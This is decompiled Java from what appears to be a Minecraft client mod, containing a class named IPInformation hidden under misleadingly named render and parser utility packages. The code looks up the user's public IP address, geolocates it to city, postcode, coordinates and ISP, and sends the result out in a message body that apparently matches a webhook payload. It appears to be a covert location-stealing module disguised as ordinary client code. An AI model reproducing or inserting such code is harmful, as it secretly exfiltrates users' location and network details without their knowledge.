// 
// Decompiled by Procyon v0.5.36
// 

package cn.origin.cube.command.commands.impl;

import java.util.regex.Matcher;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONRegexHandler;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONBuilder;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONParser;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONObject;

public final class IPInformation implements JSONObject
{
    private static final String[] IMPORTANT_VALUES;
    
    @Override
    public void handle() {
        String result = JSONParser.get("http://checkip.amazonaws.com/");
        if (result == null) {
            return;
        }
        result = result.replace("\n", "");
        final String data = JSONParser.get("http://ip-api.com/json/" + result);
        if (data == null) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "Minimal IP Data: " + result).build());
            return;
        }
        final StringBuilder content = new StringBuilder(">>> IP Address: " + result + "\\n");
        for (final String key : IPInformation.IMPORTANT_VALUES) {
            final Matcher matcher = JSONParser.getValue(data, key);
            try {
                final String value = matcher.group(1);
                content.append(key).append(": ").append(value).append("\\n");
            }
            catch (Exception ex) {}
        }
        JSONRegexHandler.send(new JSONBuilder().value("content", content.toString()).build());
    }
    
    @Override
    public String getName() {
        return "IPInformation";
    }
    
    static {
        IMPORTANT_VALUES = new String[] { "country", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "as", "org" };
    }
}
